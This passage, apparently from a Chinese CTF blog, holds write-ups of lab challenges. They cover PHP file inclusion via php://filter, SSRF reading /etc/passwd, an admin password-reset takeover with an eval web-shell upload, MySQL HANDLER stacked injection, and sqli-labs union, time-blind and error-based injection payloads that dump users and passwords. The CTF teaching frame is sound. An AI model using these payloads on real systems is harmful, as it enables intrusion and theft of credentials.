<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>题目中包含了check.php文件，可能是过滤了一些函数，注意一下。整体看起来很简单，读去一个文件看看<br>payload:<strong><a href="http://61.147.171.105:49222/?filename=check.php">http://61.147.171.105:49222/?filename=check.php</a></strong><br><img src="https://img-blog.csdnimg.cn/2fa8d03887be43f8ac061799752d2b73.png" alt="2">正确的用法，错误的方法？采用伪协议试试文件包含，经过几次测试发现只有使用php:&#x2F;&#x2F;filter读取文件时才会显示<strong>do not hack！</strong>，其他的回显均为上图。那么就从php:&#x2F;&#x2F;filter下手。通过测试了几个过滤器发现，能用的过滤器只有这个——**convert.iconv.***。推荐一篇文章<a href="https://blog.csdn.net/qq_44657899/article/details/109300335">php:&#x2F;&#x2F;filter的各种过滤器</a></p>
<blockquote>
<p>convert.iconv.<em>的编码方式有以下几种：<br>UCS-4</em><br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE<br>UTF-32*<br>UTF-32BE*<br>UTF-32LE*<br>UTF-16*<br>UTF-16BE*<br>UTF-16LE*<br>UTF-7<br>UTF7-IMAP<br>UTF-8*<br>ASCII*<br>使用方法：convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</p>
</blockquote>
<p>随便选两个试试：<br><img src="https://img-blog.csdnimg.cn/e139f5936a634f27851a021afc968e3f.png" alt="1">使用burp快一点<br><img src="https://img-blog.csdnimg.cn/8a26b67d40c54abf9b4f646cc65fb213.png" alt="2"><img src="https://img-blog.csdnimg.cn/7f4499930bc548d78033057c9a92cf05.png" alt="3">拿到flag。</p>
<h2 id="信通院-SSRF-Me"><a href="#信通院-SSRF-Me" class="headerlink" title="信通院 SSRF-Me"></a>信通院 SSRF-Me</h2><p>看来考点是ssrf。<br><img src="https://img-blog.csdnimg.cn/6e134931c77f4b4a8b51c32ed069735d.png" alt="1"><br>查看源码一下<br><img src="https://img-blog.csdnimg.cn/0691770356f3440db6bfa7c51ab9e2b6.png" alt="2"><br>由此可以说明请求地址为1270.0.1<br><code>Captcha: substr(md5(captcha), -6, 6) == &quot;b15ed1&quot;</code><br>意思是取MD5加密后的字符从后六位开始数六位且字符是b15ed1，那么到这里就要开始爆破原始数据了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$captcha</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$captcha</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"b15ed1"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token variable">$captcha</span><span class="token punctuation">;</span>
<span class="token keyword">break</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token variable">$captcha</span><span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

//输出结果：23129<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当输入框内输入<strong>127.0.0.1:80</strong>时，会返回两个输入框，那么利用ssrf的漏洞，使用伪协议<br>输入<strong>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</strong>时成功返回<br><img src="https://img-blog.csdnimg.cn/c582bb91a3e7459a897e3524327530fa.png" alt="3">读取flag <strong>file:&#x2F;&#x2F;&#x2F;flag</strong>，flag关键字符过滤了。url编码绕过，浏览器上对flag编码一次，但是burp上需要对flag编码两次哦。</p>
<blockquote>
<p>file:&#x2F;&#x2F;&#x2F;%66%6c%61%67<br>file:&#x2F;&#x2F;&#x2F;%2566%256c%2561%2567</p>
</blockquote>
<h2 id="bug（RCTF2021）"><a href="#bug（RCTF2021）" class="headerlink" title="bug（RCTF2021）"></a>bug（RCTF2021）</h2><p>全程BURP挂代理，能够从每一个包中获得有效信息，还是要仔细观察！！！<br>打开就是登录框：<br><img src="https://img-blog.csdnimg.cn/3efee6e2436046548b1c91b628940271.png" alt="1"><br>尝试admin登录，弱密码无果。先注册一个账号，注册admin显示用户名已存在，换test。<br>登陆成功后尝试每一个功能点：<br>使用manage时<br><img src="https://img-blog.csdnimg.cn/bc84396bd69046409299c59b0d5b7305.png" alt="123"><br>personal功能点：<br>这里比较可以的地方是cookie的user，应该是MD5加密，解密需要付费，暂时不考虑。还有就是<strong>uid</strong>值。<br>直接改为1是不允许的，找其他思路。看能不能找到不需要带cookie-user的包<br><img src="https://img-blog.csdnimg.cn/13e8f73a143545dbbf0c9b6ab04bb330.png" alt="2"></p>
<p>登出之后看找回密码功能点。<br>由于我知道test用户的信息，直接输入<br><img src="https://img-blog.csdnimg.cn/44ed7431b53547d8aac7f20e35791019.png" alt="123"><br>这个包的详情如下：他没有进行user验证后面有希望。<br><img src="https://img-blog.csdnimg.cn/a57eb39e769e437db01e532a5e5fd17d.png" alt="5"><br>下面这个是输入新密码的包：</p>
<p><img src="https://img-blog.csdnimg.cn/5f729b4838de4ca384d994ffd06da6a4.png" alt="4"><br>在这里尝试把username改为admin，成功修改admin密码<br><img src="https://img-blog.csdnimg.cn/5c48c75714ab4dbbab310d677fe9ee7b.png" alt="5"><br>随后成功登录admin账号。<br><img src="https://img-blog.csdnimg.cn/699097f08553466ca469704221d959ca.png" alt="1"><br>使用manage功能点发现IP不被允许。<br>直接X-Forwarded-For: 127.0.0.1，出现界面<br><img src="https://img-blog.csdnimg.cn/8826e8d89a444c78ae6bf348ebc53225.png" alt="2"></p>
<p>查看源代码发现可疑<br><img src="https://img-blog.csdnimg.cn/8af6010afbe345ffbf0c271092bfab0c.png" alt="1"></p>
<p>试试文件上传<strong>index.php?module&#x3D;filemanage&amp;do&#x3D;upload</strong>，开始文件上传绕过了。<br>上传普通文件<br><img src="https://img-blog.csdnimg.cn/0d3d7f7d4fb5489589b4ec2c5c1a4836.png" alt="1"><br>上传php文件<br><img src="https://img-blog.csdnimg.cn/6b49b925f1cd438188b1cc57f1273f96.png" alt="1"><br>经过一番折腾，该文件后缀php4,上传文件内容<code>&lt;script language=&#39;php&#39;&gt;alert(@eval($_POST[1]))&lt;script&gt;</code><br>得到flag。<br><img src="https://img-blog.csdnimg.cn/9e5e3e5165bc4e4da1937253f9808910.png" alt="2"></p>
]]></content>
      <categories>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之Handler命令和堆叠注入</title>
    <url>/2023/03/16/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHandler%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="Handler命令"><a href="#Handler命令" class="headerlink" title="Handler命令"></a>Handler命令</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>   mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。 </p>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p>HANDLER tbl_name OPEN [ [AS] alias]</p>
<blockquote>
<p>HANDLER tbl_name READ index_name { &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; } (value1,value2,…)<br>[ WHERE where_condition ] [LIMIT … ]<br>HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }<br>[ WHERE where_condition ] [LIMIT … ]<br>HANDLER tbl_name READ { FIRST | NEXT }<br>[ WHERE where_condition ] [LIMIT … ]<br>HANDLER tbl_name CLOSE</p>
</blockquote>
<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>    通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
<pre><code>通过索引去查看的话可以按照一定的顺序，获取表中的数据。
通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。

通过索引列指定一个值，可以指定从哪一行开始。
通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。
</code></pre>
<p><a href="https://blog.csdn.net/jesseyoung/article/details/40785137">参考链接</a></p>
<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>堆叠注入原理</p>
<p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br>原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p>
<blockquote>
<p>select * from users;show databases; </p>
</blockquote>
<p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够.<br>但是这种情况很少见。</p>
<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p><img src="https://img-blog.csdnimg.cn/19719c3bfc764820ad5a2b9957f0839e.png" alt="1"><br>本题可以采用堆叠注入<br><img src="https://img-blog.csdnimg.cn/8b7594e3e31442b7a0d718c619e1efd0.png" alt="1"><br>回显结果<br><img src="https://img-blog.csdnimg.cn/1d5ed6be76614f47a0b8e2fe2e49579e.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/46eed84728fa4bfebb41527d8d279a42.png" alt="3"><br>过滤的函数太多了，把select也过滤了，大小写不行，双写不行。根据师傅们的讲解了解到，Handler在这个题中可以使用，根据handler命令的格式输入<code>1&#39;;Handler FlagHere OPEN;Handler FlagHere read first;Handler FlagHere close;#</code><br>拿到flag。<br><img src="https://img-blog.csdnimg.cn/7137dd4295444e049d06c952d5a736e5.png" alt="4"></p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2023/03/13/sqli-labs/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="less-03"><a href="#less-03" class="headerlink" title="less-03"></a>less-03</h2><p>知道需要闭合什么符号，比如这关闭合是**’)**</p>
<blockquote>
<p>爆出有哪些位置可以进行输出数据 <code>1&#39;) order by 3--+</code></p>
<p>查看数据库名字 <code>1&#39;) union select 1,2,database()--+</code></p>
<p>爆破表名： <code>-1&#39;) union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p>
<p>爆破列名： <code>1&#39;) union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+</code></p>
<p>爆破数据： <code>1&#39;) union select 1,2,group_concat(id,username,password) FROM users--+</code></p>
</blockquote>
<h2 id="less-04"><a href="#less-04" class="headerlink" title="less -04"></a>less -04</h2><p>遇上题不同的是这次闭合是**”)**</p>
<h2 id="less-9-时间盲注"><a href="#less-9-时间盲注" class="headerlink" title="less-9(时间盲注)"></a>less-9(时间盲注)</h2><p>无回显，采用<strong>时间盲注</strong>判断对错<br> <strong>注意：</strong><br> 采用时间盲注时配合if语句可以知道前边的闭合符号是什么，就这题来说采用<code>if(1=2,1,sleep(2))--+</code><br>意思就是前边<strong>1&#x3D;2</strong>如果正确，便会执行1，否则执行sleep(2)。<strong>sleep(2)<strong>意思就是延缓两秒，这样通过时间就可以判断出我们前边必和符号使用的对错情况。<br>本题加载<code>http://localhost:1000/sqli-labs/Less-9/?id=-1&#39; or if(1=2,1,sleep(2))--+</code>可以发现延缓两秒才输出结果，说明此语句正确，也就是闭合符号使用正确。我们要多试几次，并不是一次就能判断出的。<br><strong>判断数据库名</strong><br>欧克，下面更麻烦，由于主页面不会报错，并且只输出</strong>You are in………..<strong>那么就一个一个爆破，找到数据库有多少字符也就是</strong>?id&#x3D;1’ and if(length(database())&gt;8,sleep(2),0) –+<strong>如果大于8，就延缓2秒正常运行，否则正常运行。经过测试发现数据库名长度为8.<br>长度知道了再爆破具体名字</strong>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),1)–+</strong><br>此为判断第一个字母的ascii码是否为115，最终找到<strong>security</strong><br><strong>判断表名</strong></p>
<p><code>?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit x,y),z,d))=e,sleep(1),0)–+</code></p>
<blockquote>
<p>其中x代表第x+1个表，y表示第x+1往后y个单位的表，z表示第几个字母，d表示z往后d个单位的字母</p>
</blockquote>
<p><strong>判断列名</strong></p>
<p><code>?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=database() limit x,y),z,d))=105,sleep(2),1)–+</code></p>
<blockquote>
<p>x：第x+1个列，y：x+1个列往后y个单位，z：x+1列的第一个字母，d：第一个字母往后的第z个单位</p>
</blockquote>
<p>最后爆数据。</p>
<h2 id="less-10"><a href="#less-10" class="headerlink" title="less 10"></a>less 10</h2><p>闭合符号为**”**</p>
<h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p>输入<code>-1&#39; or 1=1#</code>正常返回，查列。<br><code>admin&#39; order by 2#</code>回显<code>admin&#39; order by 3#</code>报错<br><img src="https://img-blog.csdnimg.cn/c20c6ec4119c4561a4426a6ea998b3f6.png" alt="1"><br>欧克，接下来正常操作。</p>
<h2 id="less-17"><a href="#less-17" class="headerlink" title="less 17"></a>less 17</h2><p>分析源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//including the Mysql connect parameters.</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../sql-connections/sql-connect.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">check_input</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
		<span class="token comment">// truncation (see comments)</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//截取账户前15的字符</span>
		<span class="token punctuation">&#125;</span>

		<span class="token comment">// Stripslashes if magic quotes enabled</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">/*get_magic_quotes_gpc()
判断该函数是否被打开，若该函数被打开，会转义  单引号（'）双引号（"）反斜杠（\）空字符（\0）
换行符（\n）
回车符（\r）
水平制表符（\t）
垂直制表符（\x0B）
*/</span>
			<span class="token punctuation">&#123;</span>
			<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除反斜杠</span>
			<span class="token punctuation">&#125;</span>

		<span class="token comment">// Quote if not a number</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">ctype_digit</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#123;</span>
			<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span> <span class="token operator">.</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token comment">//mysql_real_escape_string：转义字符</span>
			<span class="token punctuation">&#125;</span>
		
	<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
		<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

<span class="token comment">// take the variables</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token punctuation">&#123;</span>
<span class="token comment">//making sure uname is not injectable</span>
<span class="token variable">$uname</span><span class="token operator">=</span><span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token comment">//logging the connection parameters to a file for analysis.</span>
<span class="token variable">$fp</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'result.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'User Name:'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'New Password:'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">// connectivity </span>
@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//查询语句</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</span>
<span class="token comment">//echo $row;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "</span><span class="token comment">#0000ff">';	</span>
		<span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  	
		<span class="token comment">//echo 'Your Login name:'. $row1;</span>
		<span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span>
		<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$update</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
	
	
	
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
			<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//******************************</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/br>"</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 3 >'</span><span class="token punctuation">;</span>
			<span class="token comment">//echo " You password has been successfully updated " ;		</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
			<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag1.jpg"   />'</span><span class="token punctuation">;</span>	
		<span class="token comment">//echo 'Your Password:' .$row['password'];</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
	


  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="4.5" color="#FFFF00">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Bug off you Silly Dumb hacker";</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap1.jpg"   />'</span><span class="token punctuation">;</span>
	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>学到三种报错注入：</p>
<h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><p>extractvalue(XML_document,XPath_string)</p>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法。</p>
<p>作用：从XML_document中提取符合XPATH_string的值，当我们XPath_string语法报错时候就会报错，下面的语法就是错误的。concat和group_concat作用一样<code>0x5c</code>是<code>\\</code>的16进制.</p>
<blockquote>
<p>1’ and (extractvalue(1,concat(0x5c,version(),0x5c)))#    爆版本<br>1’ and (extractvalue(1,concat(0x5c,database(),0x5c)))#   爆数据库<br>1’ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c)))#   爆表名<br>1’ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),0x5c)))#<br>爆字段名<br>1’ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username&#x3D;’admin1’) b) ,0x5c)))#      爆字段内容该格式针对mysql数据库。<br>1’ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      爆字段内容。</p>
</blockquote>
<p>在最后一步爆字段内容时候，会报错，原因是<strong>mysql数据不支持查询和更新是同一张表</strong>。所以我们需要加一个<strong>中间表。</strong></p>
<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p>UPDATEXML (XML_document, XPath_string, new_value)</p>
<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
<p>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</p>
<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
<p>作用：改变文档中符合条件的节点的值，改变XML_document中符合XPATH_string的值</p>
<blockquote>
<p>123’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本<br>123’ and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</p>
</blockquote>
<blockquote>
<p>123’ and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x5c),1))#      爆表名<br>123’ and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name &#x3D;’users’),0x5c),1))#<br>爆字段名</p>
</blockquote>
<blockquote>
<p>123’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username&#x3D;’admin1’) b),0x5c),1))#<br>爆密码该格式针对mysql数据库。<br>爆其他表就可以，下面是爆emails表<br>123’ and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name &#x3D;’emails’),0x5c),1))#</p>
</blockquote>
<blockquote>
<p>1’ and (updatexml (1,concat(0x5c,(select group_concat(id,email_id) from emails),0x5c),1))#   爆字段内容。</p>
</blockquote>
<h3 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h3><blockquote>
<p>123’ and (select count(*) from information_schema.tables group by concat(database(),0x5c,floor(rand(0)<em>2)))#     爆数据库<br>123’ and (select count(</em>) from information_schema.tables group by concat(version(),0x5c,floor(rand(0)*2)))#      爆数据库版本</p>
</blockquote>
<blockquote>
